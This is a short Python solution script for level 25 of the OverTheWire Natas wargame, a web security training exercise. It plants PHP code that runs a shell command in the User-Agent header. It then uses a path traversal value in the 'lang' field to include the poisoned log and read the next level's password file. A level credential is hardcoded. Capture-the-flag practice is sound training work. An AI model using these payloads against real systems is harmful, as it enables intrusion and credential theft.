#!/usr/bin/python3
# Time: 2019/04/23 8:19 PM


import requests
import base64
import codecs


username = 'natas25'
password = 'GHF6X7YwACaYYssHVY05cFq83hRktl4c'
url = f'http://{username}.natas.labs.overthewire.org/'

# url = f'http://{username}.natas.labs.overthewire.org/'
s = requests.Session()

headers = {"User-Agent": "<?php system('cat /etc/natas_webpass/natas26'); ?>"}


respX = s.get(url, auth=(username, password))
resp = s.post(url, headers=headers, auth=(username, password), data={"lang": "..././..././..././..././..././var/www/natas/natas25/logs/natas25_" + s.cookies["PHPSESSID"] + ".log"})


print()   # in3hd41mlvrkqe7a42gh2l3ec4
# resp = s.post(url, auth=(username, password), data={"lang": ""})
print(resp.text)
print("**"*40)
# /var/www/natas/natas25/logs/natas25_

